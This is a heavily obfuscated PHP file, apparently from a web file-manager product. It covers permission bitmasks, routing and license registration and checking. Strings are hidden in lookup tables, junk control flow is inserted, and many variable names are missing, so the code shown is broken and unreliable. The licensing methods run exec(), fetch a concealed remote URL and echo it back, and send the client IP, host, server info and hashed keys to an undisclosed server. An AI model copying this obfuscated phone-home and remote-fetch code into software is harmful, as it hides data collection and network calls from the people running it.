$킲 = $[8]; $ۼ = $GLOBALS[$[6]][$[1340]] == $[1341]; if ($ۼ) { $킲 = $[1882]; if (function_exists($[1883])) { exec($[1884], $類); $킲 = $類[1] . $[8]; } } if (!file_exists($킲)) { return; } $֋ = @disk_total_space($킲); $ = $֋ - @disk_free_space($킲); return array($[1872] => $֋, $[1874] => $); } public function fileChart($՟) { $բ =& $_SERVER[]; if (isset($՟[$բ[1687]])) { return Model($բ[859])->userFileTypeProfile($՟[$բ[1687]]); } if (isset($՟[$բ[1885]])) { return Model($բ[859])->groupFileTypeProfile($՟[$բ[1885]]); } $܃ݴ = $this->sourceSize(); $ϫ = array($բ[180] => 0, $բ[178] => 1); $ = Model($բ[859])->where($ϫ)->sum($բ[76]); $ϫ[$բ[178]] = 2; $Ӄ = Model($բ[859])->where($ϫ)->sum($բ[76]); return array($բ[797] => $܃ݴ[$բ[76]], $բ[1819] => $܃ݴ[$բ[1819]], $բ[1820] => (int) $, $բ[1821] => (int) $Ӄ); } private function sourceSize() { $ =& $_SERVER[]; $΍ = Model($[859])->where(array($[453] => 0))->sum($[76]); $٩ = Model($[512])->sum($[76]); if ($٩ > $΍) { $٩ = $΍; } return array($[76] => (int) $΍, $[1819] => (int) $٩); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ =& $_SERVER[]; $ĭ = array(array($[462] => LNG($[1886]), $[1887] => $[1888], $[1889] => 1, $[1890] => 1, $[1891] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($[462] => LNG($[1892]), $[1887] => $[1893], $[1889] => 2, $[1890] => 1, $[1891] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($[462] => LNG($[1894]), $[1887] => $[1895], $[1889] => 3, $[1890] => 1, $[1891] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($[462] => LNG($[1896]), $[1887] => $[1897], $[1889] => 4, $[1890] => 1, $[1891] => self::AUTH_SHOW | self::AUTH_VIEW), array($[462] => LNG($[1898]), $[1887] => $[1899], $[1889] => 5, $[1890] => 1, $[1891] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($[462] => LNG($[1900]), $[1887] => $[1901], $[1889] => 6, $[1890] => 1, $[1891] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($[462] => LNG($[1902]), $[1887] => $[1903], $[1889] => 7, $[1890] => 1, $[1891] => 0)); return $ĭ; } public static function authCheck($, $ɡ) { $ۍ =& $_SERVER[]; $ = intval($); if ($GLOBALS[$ۍ[536]] && $GLOBALS[$ۍ[6]][$ۍ[1904]]) { return !0; } if ($ <= 0) { return !1; } if (($ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ & $ɡ); } public static function authCheckShow($Ќ) { return self::authCheck($Ќ, self::AUTH_SHOW); } public static function authCheckView($ـ) { return self::authCheck($ـ, self::AUTH_VIEW); } public static function authCheckDownload($) { return self::authCheck($, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Μ) { return self::authCheck($Μ, self::AUTH_UPLOAD); } public static function authCheckEdit($ω) { return self::authCheck($ω, self::AUTH_EDIT); } public static function authCheckRemove($) { return self::authCheck($, self::AUTH_REMOVE); } public static function authCheckShare($ՠ) { return self::authCheck($ՠ, self::AUTH_SHARE); } public static function authCheckComment($ŷ) { return self::authCheck($ŷ, self::AUTH_COMMENT); } public static function authCheckEvent($ߕ) { return self::authCheck($ߕ, self::AUTH_EVENT); } public static function authCheckRoot($ֽ) { return self::authCheck($ֽ, self::AUTH_ROOT); } public static function authCheckAction($ٜ, $߇) { $͏ি =& $_SERVER[]; $ = array($͏ি[1905] => self::AUTH_VIEW, $͏ি[1235] => self::AUTH_DOWNLOAD, $͏ি[107] => self::AUTH_UPLOAD, $͏ি[1855] => self::AUTH_EDIT, $͏ি[1854] => self::AUTH_REMOVE, $͏ি[1865] => self::AUTH_SHARE, $͏ি[398] => self::AUTH_COMMENT, $͏ি[1675] => self::AUTH_EVENT, $͏ি[1906] => self::AUTH_ROOT); if (!isset($[$߇])) { return; } $ = $[$߇]; $ٜ = intval($ٜ); if ($ٜ <= 0) { return !1; } if (($ٜ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ٜ & $); } public static function authDisable($܂, $ˈ) { if (intval($܂) <= 0) { return 0; } return intval($܂) & ~$ˈ; } public $optionType = "\123\171\x73\x74\x65\155\x2e\163\157\165\x72\x63\145\x41\x75\164\x68\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\141\x75\164\x68", "\154\141\142\145\x6c", "\x64\151\163\160\154\141\171", "\x73\171\x73\x74\x65\155", "\x73\157\162\x74"); public function initData() { $ = $this->authDefault(); foreach ($ as $ґ) { $this->add($ґ); } } public function findAuth($ˉ, $¾) { $өǫ =& $_SERVER[]; $ = parent::listData(); foreach ($ as $䛴) { $ = intval($䛴[$өǫ[455]]); if ($ <= 0 || $䛴[$өǫ[1907]] == 0) { continue; } if (($ & $ˉ) != $ˉ) { continue; } if (($ & $¾) != 0) { continue; } return $䛴[$өǫ[443]]; } return !1; } public function findAuthReadOnly() { $ؾ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $˔ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ؾ, $˔); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ =& $_SERVER[]; $ = parent::listData(); $; = !1; foreach ($ as $ڤ) { if ($ڤ[$[455]] <= 0 || $ڤ[$[1907]] == $[212]) { continue; } if (!$;) { $; = $ڤ; continue; } if ($;[$[455]] > $ڤ[$[455]]) { $; = $ڤ; } } return $; ? $;[$[443]] : $[12]; } public function listData($՚ = false, $߾ = "\x73\157\162\x74", $΢ = false) { return parent::listData($՚, $߾, $΢); } public function update($ہ, $) { $౎ =& $_SERVER[]; $ = parent::listData($ہ); $ = $this->findByName($[$౎[32]]); if (!$ || $ && $[$౎[443]] != $[$౎[443]]) { return !1; } $this->filterAuth($[$౎[455]]); return parent::update($ہ, $); } public function remove($ր) { $ = parent::listData($ր); if (!$ || $[$_SERVER[][179]]) { return !1; } return parent::remove($ր); } public function add($ᠴ = array()) { $ =& $_SERVER[]; if ($this->findByName($ᠴ[$[32]])) { return !1; } $ = array($[32] => $[12], $[455] => 1, $[1908] => $[1895], $[1907] => 1, $[179] => 0, $[1909] => 0); $ᠴ = array_merge($, $ᠴ); $ᠴ[$[1909]] = $this->getSort(); $this->filterAuth($ᠴ[$[455]]); return parent::insert($ᠴ); } private function getSort() { $ =& $_SERVER[]; $Æ = parent::listData(); $ = array_to_keyvalue($Æ, $[12], $[1909]); return empty($) ? 0 : max($) + 1; } private function filterAuth(&$≒) { if (!$≒) { return; } $ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ҳћ = array(); foreach ($ as $Ƀ) { if ($≒ & $Ƀ) { $Ҳћ[] = $Ƀ; } } if (in_array(self::AUTH_ROOT, $Ҳћ)) { $≒ = array_sum($); return; } $ց = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ҳћ as $Ƀ) { if (isset($ց[$Ƀ])) { $Ҳћ = array_merge($Ҳћ, $ց[$Ƀ]); } } $Ҳћ[] = self::AUTH_SHOW; $≒ = array_sum(array_unique($Ҳћ)); } public function sort($׋, $ܒ) { return parent::update($׋, $ܒ); } } goto cЉ; bӑ: $fxmzojyldb = $_SERVER[][651]; class Application { private $defaultModule = "\x69\156\x64\145\170"; private $defaultController = "\151\x6e\x64\145\170"; private $defaultAction = "\151\156\144\x65\170"; function __construct() { } public function setDefault($) { $俘˶ =& $_SERVER[]; $ =& $_SERVER[]; $ = explode($[0], trim($, $[0])); $ԥ = $俘˶[652]; if (strlen($ԥ) < $俘˶[653]) { die; } $this->defaultModule = $[0] ? $[0] : $this->defaultModule; $ᚍ = $俘˶[654]; if (!$ᚍ) { die; } $this->defaultController = $[1] ? $[1] : $this->defaultController; $Ϲ = $俘˶[655]; if (!$Ϲ) { return; } $this->defaultAction = $[2] ? $[2] : $this->defaultAction; $ = $俘˶[656]; while (strlen($) < $俘˶[657]) { if (!$) { break; } $++; } $this->cwjqf7c7a23e($[1], array($this, $[2])); } public function appRun($) { $պ =& $_SERVER[]; $Տ =& $_SERVER[]; $ٳ = explode($Տ[0], $); $Ĵ = strtolower($ٳ[0]); $۶ǿ = $պ[658]; if (!$۶ǿ) { die; } $ݦ = $Տ[3]; $ = $պ[659]; if (!$) { die; } if ($Ĵ == $Տ[4]) { $ݦ = $Տ[5]; $ٳ[0] = $Տ[6]; $ٳ[1] = $ٳ[1] . $Տ[7]; $ = join($Տ[0], $ٳ); $ = trim($, $Տ[0]); } call_user_func(array($Տ[8], $Տ[9]), $ݦ . $Տ[10], $); ActionCall($); $Ǭܟ = $պ[660]; call_user_func(array($Տ[8], $Տ[9]), $ݦ . $Տ[11], $); $ٰ = $պ[661]; while (strlen($ٰ) < $պ[653]) { if (!$ٰ) { break; } $ٰ++; } } private function autorun() { $ =& $_SERVER[]; global $config; if (count($config[$[12]]) == 0) { return; } foreach ($config[$[12]] as $ => $) { $this->appRun($); } } private function jazv58749411() { $ܪ =& $_SERVER[]; $ޔ =& $_SERVER[]; $ = $ޔ[4]; $ˊ = $GLOBALS[$ޔ[13]][$ޔ[14]][0]; $杗 = $ܪ[662]; if (strlen($杗) < $ܪ[653]) { die; } if (!$ˊ || strlen($ˊ) <= strlen($)) { return; } if (strtolower(substr($ˊ, -strlen($))) != $) { return; } $ = substr($ˊ, 0, -strlen($)); $ݳ = $ܪ[663]; $ݸ = array($ޔ[4], $); $ = array_slice($GLOBALS[$ޔ[13]][$ޔ[14]], 1); $Ć = $ܪ[664]; if (!$Ć) { return; } $GLOBALS[$ޔ[13]][$ޔ[14]] = array_merge($ݸ, $); $د± = $ܪ[665]; if (strlen($د±) < $ܪ[657]) { die; } $GLOBALS[$ޔ[13]][$ޔ[15]] = implode($ޔ[0], $GLOBALS[$ޔ[13]][$ޔ[14]]); $ȶ = $ܪ[666]; } private function hfwd54bde48b() { $̫ =& $_SERVER[]; $򃉷 =& $_SERVER[]; if ($GLOBALS[$򃉷[13]][$򃉷[15]] != $򃉷[6]) { return; } $ωִ = $_SERVER[$򃉷[16]]; $Ƭ = $̫[667]; if (strlen($Ƭ) < $̫[668]) { die; } $ǥ = $򃉷[17]; if (!strstr($ωִ, $ǥ)) { return; } $Ĺ줏 = strrpos($ωִ, $ǥ); $ݐ = substr($ωִ, $Ĺ줏 + strlen($ǥ)); preg_match_all($򃉷[18], $ݐ, $); $ݐ = trim($[0][0], $򃉷[19]); $ɠ = $̫[669]; if (!$ɠ) { return; } $GLOBALS[$򃉷[13]][$򃉷[14]] = explode($򃉷[19], $ݐ); $ = $̫[670]; $GLOBALS[$򃉷[13]][$򃉷[15]] = implode($򃉷[0], $GLOBALS[$򃉷[13]][$򃉷[14]]); $Ɲ = $̫[671]; } public function run() { $ݞ =& $_SERVER[]; $ =& $_SERVER[]; $this->hfwd54bde48b(); $ = $ݞ[672]; while ($ < $ݞ[653]) { if ($ >= 0) { break; } $++; } $this->jazv58749411(); $ = $GLOBALS[$[13]][$[14]]; $抋 = $GLOBALS[$[13]][$[15]]; $ = $ݞ[673]; while (strlen($) < $ݞ[674]) { if (!$) { break; } $++; } define($[20], isset($[0]) && $[0] ? $[0] : $this->defaultModule); $ = $ݞ[675]; define($[21], isset($[1]) && $[0] ? $[1] : $this->defaultController); define($[22], isset($[2]) && $[0] ? $[2] : $this->defaultAction); define($[23], MOD . $[0] . ST . $[0] . ACT); $ᑹ = $ݞ[676]; while (strlen($ᑹ) < $ݞ[668]) { if (!$ᑹ) { break; } $ᑹ++; } $_SERVER[$[24]] = strtolower(ACTION); $߉ = $ݞ[677]; if (strlen($߉) < $ݞ[668]) { die; } $this->autorun(); if (count($) >= 3) { $this->appRun($抋); } else { $this->appRun(ACTION); } } private $xaog87f6bbb0 = array(); private $efuzce9e4966 = ''; public function vcsic75528b8() { $ =& $_SERVER[]; $ =& $_SERVER[]; $this->vwgt5d87753e(); $ = $[678]; if (strlen($) < $[653]) { die; } $this->glfedcbe80cf(); $this->typb281849cf(); $this->yrpeec9f114a(); $this->yate256b19f8(); $Ċ = $[679]; if (strlen($Ċ) < $[674]) { die; } $this->nhbvc4f910d3(); $׶ = $[680]; if (strlen($׶) < $[674]) { return; } $this->zidue0c6587f(); $ל = $[681]; if (strlen($ל) < $[682]) { return; } $this->cwjqf7c7a23e($[25], array($this, $[26])); $Ȣ = $[683]; if (strlen($Ȣ) < $[674]) { return; } $this->cwjqf7c7a23e($[27], array($this, $[28])); $this->cwjqf7c7a23e($[29], array($this, $[30])); $this->cwjqf7c7a23e($[31], array($this, $[32])); $¹ = $[684]; if (!$¹) { die; } } public function qgbmd4dd187e($ɪ) { $ꔤ =& $_SERVER[]; $ל =& $_SERVER[]; $۲案 = Model($ל[33])->get(); $ = array($ל[34], $ל[35], $ל[36], $ל[37], $ל[38], $ל[39], $ל[40], $ל[41], $ל[42], $ל[43], $ל[44], $ל[45], $ל[46], $ל[47], $ל[48], $ל[49], $ל[50], $ל[51], $ל[52], $ל[53], $ל[54], $ל[55], $ל[56], $ל[57], $ל[58], $ל[59], $ל[60], $ל[61], $ל[62], $ל[63], $ל[64], $ל[65], $ל[66], $ל[67], $ל[68], $ל[69], $ל[70], $ל[71], $ל[72], $ל[73], $ל[74], $ל[75], $ל[76], $ל[77], $ל[78], $ל[79], $ל[80], $ל[81], $ל[82], $ל[83], $ל[84]); $ = $ꔤ[685]; if (strlen($) < $ꔤ[668]) { return; } foreach ($ as $萏) { $ = $GLOBALS[$ל[85]][$ל[86]][$萏]; if (isset($۲案[$萏])) { $ = $۲案[$萏]; } $ɪ[$ל[87]][$ל[88]][$萏] = $; } $č = $ɪ[$ל[87]][$ל[88]][$ל[46]]; $韔» = $ꔤ[686]; if (!$韔») { return; } unset($ɪ[$ל[87]][$ל[89]][$ל[90]]); unset($ɪ[$ל[87]][$ל[89]][$ל[91]]); unset($ɪ[$ל[87]][$ל[88]][$ל[46]]); unset($ɪ[$ל[87]][$ל[88]][$ל[92]]); $ = $ꔤ[687]; while (strlen($) < $ꔤ[674]) { if (!$) { break; } $++; } $ɪ[$ל[87]][$ל[88]][$ל[93]] = array($ל[94] => (int) $č[$ל[95]], $ל[96] => (int) _get($č, $ל[97], 0)); $ = substr(md5($ל[98] . get_client_ip() . $۲案[$ל[99]]), 0, 15); $ɪ[$ל[100]][$ל[101]] = Mcrypt::encode(Session::sign(), $, 3600 * 24); $ = $ꔤ[688]; $ɪ[$ל[100]][$ל[102]] = Action($ל[103])->accessToken(); $բ = $ꔤ[689]; if (strlen($բ) < $ꔤ[657]) { die; } $ɪ[$ל[100]][$ל[104]] = md5($_SERVER[$ל[105]] . $۲案[$ל[99]]); $ɪ[$ל[100]][$ל[106]] = base64_encode(serverInfo()); $ = $ꔤ[690]; if (!$) { die; } $ɪ[$ל[100]][$ל[107]] = $this->efuzce9e4966; $йݜ = $ꔤ[691]; while ($йݜ < $ꔤ[682]) { if ($йݜ >= 0) { break; } $йݜ++; } if ($۲案[$ל[107]] != $ל[108]) { $ɪ[$ל[100]][$ל[109]] = $۲案[$ל[109]]; $ɪ[$ל[100]][$ל[110]] = $۲案[$ל[110]]; $ʧ = rand_string(10) . $this->efuzce9e4966 . rand_string(5); $ɪ[$ל[87]][$ל[111]][$ל[112]] = $this->txia8c1128bf($ʧ, $ɪ[$ל[100]][$ל[104]]); } if ($this->efuzce9e4966 == $ל[108]) { $ɪ[$ל[87]][$ל[88]][$ל[93]][$ל[97]] = 0; } $ɪ[$ל[100]][$ל[113]] = _get($this->xaog87f6bbb0, $ל[114], $ל[6]); $ɪ[$ל[100]][$ל[115]] = _get($this->xaog87f6bbb0, $ל[116], $ל[6]); $ǀ = $ꔤ[692]; if (strlen($ǀ) < $ꔤ[674]) { die; } if (_get($GLOBALS, $ל[117]) && $this->config[$ל[118]]) { $ɪ[$ל[100]][$ל[119]] = WEB_ROOT; } return $ɪ; } private function nhbvc4f910d3() { $ =& $_SERVER[]; $ =& $_SERVER[]; $梟 = $_SERVER[$[24]] == $[120]; $ɐ = $[693]; if (strlen($ɐ) < $[653]) { return; } if ($_SERVER[$[24]] == $[121] && $_GET[$[122]] == $[123]) { $梟 = !0; } if ($梟) { $ = array($[107] => $this->efuzce9e4966, $[124] => $this->jifo55b6dd1a(), $[125] => Model($[126])->count()); if ($this->efuzce9e4966 != $[108]) { $󦁢 = _get($this->xaog87f6bbb0, $[127]); if ($󦁢) { $[$[128]] = $󦁢; $[$[129]] = strtotime(_get($this->xaog87f6bbb0, $[130])); $[$[131]] = _get($this->xaog87f6bbb0, $[116]); } $ͪ = Model($[33])->get($[132], $[6], !0); if (is_string($ͪ) && substr($ͪ, 0, 1) == $[133]) { $ͪ = json_decode_force($ͪ); } if (is_array($ͪ) && $ͪ[$[134]] && strstr($ͪ[$[134]], $[135])) { $ = explode($[135], $ͪ[$[134]]); $[$[136]] = $[0]; } } $ = $this->dxwtd6d0e49b(json_encode($), md5($[137])); $ = array($[138] => $); $⽯ = $[694]; if (!$⽯) { die; } call_user_func(array($[139], $[140]), $); } if ($this->efuzce9e4966 == $[108]) { return; } $⅋ = array($[141], $[142], $[143], $[144], $[145], $[146]); $ڼ = $[695]; while ($ڼ < $[674]) { if ($ڼ >= 0) { break; } $ڼ++; } $ = Model($[33])->get(); $󁭿 = $[696]; if (!$󁭿) { die; } $ = array($[147] => $[$[34]], $[148] => $[$[35]], $[149] => $[6]); foreach ($⅋ as $ěֻ) { if (!isset($[$ěֻ]) || !$[$ěֻ]) { continue; } $[$ěֻ] = $[$ěֻ]; } call_user_func(array($[139], $[140]), $); $ = $[697]; } private function yrpeec9f114a() { $ =& $_SERVER[]; $ =& $_SERVER[]; if ($_SERVER[$[24]] != $[150]) { return; } if (!_get($GLOBALS, $[117])) { die; } $ = $GLOBALS[$[13]]; if (isset($[$[151]])) { $this->dmlc7f9824f0(); die; } if (!isset($[$[152]]) || strlen($[$[152]]) != 16) { show_json($[153] . $[$[152]], !1); } $ = Model($[33])->get($[99]); $ٹ = md5($_SERVER[$[105]] . $); $Ť́ = array($[152] => $[$[152]], $[154] => rand_string(16), $[155] => $[137], $[156] => $[157], $[158] => $_SERVER[$[159]], $[160] => $_SERVER[$[161]], $[162] => $_SERVER[$[163]], $[104] => $ٹ, $[164] => Model($[33])->get($[132])); $ۣ = $[698]; if ($[$[165]] == $[166]) { $Ի = $this->dxwtd6d0e49b($ٹ, $[167]); $ = $this->txia8c1128bf(json_encode($Ť́), $ٹ . $[168], 3); $ = $ . $[169] . $_SERVER[$[159]]; $ = $this->vzri9d86e10d($[170] . $Ի . $[171] . $, -1); show_json($, !0); } else { if ($[$[165]] == $[172]) { $ = substr(md5($[173] . $ٹ), 12, 15) . $[174]; $ = $this->odgla1d73d15(trim($[$[175]]), $, 2); $ = json_decode($, !0); if (!is_array($) || !is_array($[$[176]]) || $[$[152]] != !0) { $ = $[177]; $߃ = $[$[176]] ? $[178] . $[$[176]] : $; show_json($߃, !1); } else { $Ť́[$[154]] = $[$[176]][$[179]]; } } else { $ = $this->vzri9d86e10d($[180], $Ť́, 10); $蚲 = $[699]; if (!$蚲) { die; } } } if (!is_array($) || !is_array($[$[176]]) || $[$[152]] != !0) { $ = LNG($[181]); $߃ = $[$[176]] ? $[178] . $[$[176]] : $; show_json($߃, !1); } $ = $[$[176]]; $ = $this->jwsf34856106($[$[182]]); $ղ = $[700]; while (strlen($ղ) < $[657]) { if (!$ղ) { break; } $ղ++; } if (!$ || $ != $[$[130]]) { $ݽ = array($[183] => Model($[33])->get($[99]), $[184] => $_SERVER[$[105]], $[185] => this_url(), $[160] => $_SERVER[$[161]]); $ = $this->mscx7993f758(json_encode($ݽ)); $this->vzri9d86e10d($[186] . $); show_json(LNG($[187]), !0); } $ = array($[188] => $[$[189]], $[190] => $[$[191]], $[192] => rand_string(16), $[107] => $[$[193]]); if ($Ť́[$[154]]) { $[$[192]] = $Ť́[$[154]]; } $ = substr(md5($[$[190]]), 10, 10); $Ӟ = $ . $[$[107]] . $[$[192]]; $[$[109]] = strrev(base64_encode($this->dxwtd6d0e49b($Ӟ, $[194]))); $ϱН = rand_string(16); $ = $ϱН . $[$[107]] . $this->dxwtd6d0e49b(md5($[$[188]]), $ϱН); $ɕ = $[701]; if (strlen($ɕ) < $[682]) { die; } $[$[110]] = base64_encode(strrev($this->dxwtd6d0e49b($, $[195]))); if ($[$[196]] && $[$[196]] >= 1) { Model($[33])->setDeep($[197], $[123]); } Model($[33])->set($); $ə = md5($_SERVER[$[105]] . strrev($) . $[$[190]]); $ڭ = strrev(substr($ə, 10, 16)); $ů׬ = $[702]; if (strlen($ů׬) < $[682]) { die; } $û = $this->txia8c1128bf(json_encode($), $ə); $§ = array_to_keyvalue(Model($[7])->listData(), $[198]); $ݭ = $§[$[199]]; $ = $[703]; while ($ < $[657]) { if ($ >= 0) { break; } $++; } $ = array(); $ = $[704]; $[$ڭ] = $û; $ؔ = $[705]; if (!$ؔ) { die; } Model($[7])->update($ݭ[$[200]], array($[201] => $)); $this->xaog87f6bbb0 = $; $this->efuzce9e4966 = $[$[107]]; $this->licenseRegistSuccess(); Cache::set($[202] . md5($ . $[203]), $[6]); $ = $[706]; show_json(LNG($[187]), !0); $ٵ¼ = $[707]; if (strlen($ٵ¼) < $[674]) { return; } } private function licenseRegistSuccess() { $ı =& $_SERVER[]; $ʔ = Model($ı[33])->get(); if ($ʔ[$ı[63]] != $ı[123]) { Model($ı[33])->set($ı[63], $ı[123]); } Action($ı[204])->initStart(!0); } private function dmlc7f9824f0() { $ =& $_SERVER[]; $Ү =& $_SERVER[]; Model($Ү[33])->set(array($Ү[188] => $Ү[6], $Ү[190] => $Ү[6], $Ү[107] => $Ү[108], $Ү[109] => $Ү[6], $Ү[110] => $Ү[6])); $ = $[708]; Model($Ү[33])->setDeep($Ү[197], $Ү[205]); $this->xaog87f6bbb0 = array(); $䗿 = $[709]; if (strlen($䗿) < $[653]) { die; } $this->efuzce9e4966 = $Ү[108]; $ = $[710]; if (!$) { die; } } private function vwgt5d87753e() { $ֺ۲ =& $_SERVER[]; $ʞ =& $_SERVER[]; $_SERVER[$ʞ[161]] = _get($_SERVER, $ʞ[161], APP_HOST); $⅁ = $ֺ۲[711]; if (!$⅁) { return; } $this->efuzce9e4966 = $ʞ[108]; $ݼ = $ֺ۲[712]; if (!$ݼ) { die; } $ڨ = Model($ʞ[33])->get(); if ($ڨ[$ʞ[107]] == $ʞ[108]) { return; } $ؿ = Model($ʞ[33])->get($ʞ[99]); $ϓ = $ʞ[202] . md5($ؿ . $ʞ[203]); $ = $ֺ۲[713]; while ($ < $ֺ۲[682]) { if ($ >= 0) { break; } $++; } $ʄ̬ = Cache::get($ϓ); if (!is_array($ʄ̬) || !isset($ʄ̬[$ʞ[206]]) || time() - $ʄ̬[$ʞ[206]] >= 60) { $Ǚ = Model($ʞ[7])->loadList(); $ĺ = $Ǚ[$ʞ[199]]; $Ў = md5($_SERVER[$ʞ[105]] . strrev($ؿ) . $ڨ[$ʞ[190]]); $Ԭ = strrev(substr($Ў, 10, 16)); $ʄ̬ = $this->odgla1d73d15($ĺ[$ʞ[85]][$Ԭ], $Ў); $ʄ̬ = json_decode($ʄ̬, !0); } if (!is_array($ʄ̬)) { return $this->dmlc7f9824f0(); } $ = strtotime($ʄ̬[$ʞ[130]]); if (time() >= $) { return $this->dmlc7f9824f0(); } if (time() - $ʄ̬[$ʞ[206]] > 20) { $ʄ̬[$ʞ[206]] = time(); Cache::set($ϓ, $ʄ̬); } $this->xaog87f6bbb0 = $ʄ̬; $this->efuzce9e4966 = $ڨ[$ʞ[107]]; } private function glfedcbe80cf() { $ԯ =& $_SERVER[]; $ =& $_SERVER[]; $ڢ = $GLOBALS[$[13]]; $ؠ = $ԯ[714]; $܉Ѽ = $_SERVER[$[24]]; $ = $ԯ[715]; if (!$) { return; } if ($܉Ѽ == $[207] && $this->efuzce9e4966 == $[108]) { show_json(LNG($[208]), !1, $[209]); } $ = array($[210], $[211]); if (in_array($܉Ѽ, $)) { if ($this->efuzce9e4966 == $[108] && isset($ڢ[$[212]])) { show_json(LNG($[208]), !1, $[209]); die; } $֨ = $this->jifo55b6dd1a(); if ($֨ != intval($[213])) { if ($֨ <= Model($[126])->count()) { show_json(LNG($[214]), !1, $[209]); die; } } } } private function typb281849cf() { $ =& $_SERVER[]; $̎ =& $_SERVER[]; $ = array($̎[120], $̎[121]); $ = $[716]; if (!$) { die; } if (!_get($GLOBALS, $̎[117]) || !isset($_GET[$̎[215]])) { return; } if (!in_array($_SERVER[$̎[24]], $)) { return; } $ĺ = $̎[216]; $σ = $[717]; if (strlen($σ) < $[653]) { return; } $ĺ = $this->gimab260fda7($ĺ, $̎[217]); $ = stream_context_create(array($̎[218] => array($̎[219] => $̎[220], $̎[221] => 3))); $ = @file_get_contents($ĺ, !1, $); $꠸ = $[718]; if (!$꠸) { die; } header($̎[222]); $ʹ = $[719]; if ($ && strstr($, $̎[223])) { echo $; } die; } public function ntivf4cae276($) { $ʽ =& $_SERVER[]; $ݝ =& $_SERVER[]; if ($this->efuzce9e4966 == $ݝ[224]) { return $; } $̮ = array($ݝ[225] => $ݝ[226], $ݝ[227] => $ݝ[226], $ݝ[228] => $ݝ[226], $ݝ[229] => $ݝ[230], $ݝ[231] => $ݝ[230], $ݝ[232] => $ݝ[230], $ݝ[233] => $ݝ[230], $ݝ[234] => $ݝ[230], $ݝ[235] => $ݝ[230], $ݝ[236] => $ݝ[230], $ݝ[237] => $ݝ[230], $ݝ[238] => $ݝ[230], $ݝ[239] => $ݝ[230], $ݝ[240] => $ݝ[230], $ݝ[241] => $ݝ[230]); $ੵ = $ʽ[720]; if (strlen($ੵ) < $ʽ[668]) { return; } $˦Ѭ = explode($ݝ[242], _get($this->xaog87f6bbb0, $ݝ[114], $ݝ[6])); $Ҍ = $ʽ[721]; while ($Ҍ < $ʽ[657]) { if ($Ҍ >= 0) { break; } $Ҍ++; } $ = array(); foreach ($̮ as $ր => $) { if ($ == $ݝ[226] && substr($this->efuzce9e4966, 0, 1) == $ݝ[226]) { continue; } if (!in_array($ր, $˦Ѭ)) { $[] = $ր; } } foreach ($ as $ր) { unset($[$ր]); } return $; $ƈ = $ʽ[722]; } private function zidue0c6587f() { $§ =& $_SERVER[]; if ($this->efuzce9e4966 != $§[108]) { $GLOBALS[$§[85]][$§[89]][$§[243]] = $§[205]; return; } $GLOBALS[$§[85]][$§[244]] = $§[123]; if (Model($§[245])->get($§[63]) != $§[205]) { Model($§[245])->set($§[63], $§[205]); } } public function jdvk2ef447da() { return $_SERVER[][246]; $ = $_SERVER[][723]; if (!$) { die; } } private function yate256b19f8() { $犮 =& $_SERVER[]; $ =& $_SERVER[]; $ = array($[247], $[248], $[249]); $ձ = $犮[724]; if (!$ձ) { die; } $ = $[250] . md5($[251]); if ($this->efuzce9e4966 == $[108] || !_get($GLOBALS, $[117])) { return; } if (!in_array($_SERVER[$[24]], $)) { return; } if (time() % 4 != 0) { return; } $ = call_user_func(array($[252], $[253]), $); $ = $犮[725]; if (strlen($) < $犮[657]) { die; } if ($ && time() - $ < intval($[254])) { return; } call_user_func(array($[252], $[140]), $, time()); $ = $犮[726]; if (!$) { die; } $ۋ܆ = Model($[33])->get($[99]); $ = $犮[727]; $ᙰ = array($[152] => Model($[33])->get($[188]), $[165] => $this->efuzce9e4966, $[162] => $_SERVER[$[163]], $[164] => Model($[33])->get($[132]), $[104] => md5($_SERVER[$[105]] . $ۋ܆), $[155] => $[137], $[158] => $_SERVER[$[159]]); $ = $犮[728]; if (!$) { return; } $ = $this->vzri9d86e10d($[255], $ᙰ); if (!is_array($)) { return; } if ($[$[152]] && $[$[256]]) { if ($this->jwsf34856106($[$[256]]) == $ᙰ[$[152]]) { return; } } $this->dmlc7f9824f0(); if ($this->jwsf34856106($[$[256]]) != $ᙰ[$[152]]) { $׏ = array($[183] => $ۋ܆, $[184] => $_SERVER[$[105]], $[185] => this_url(), 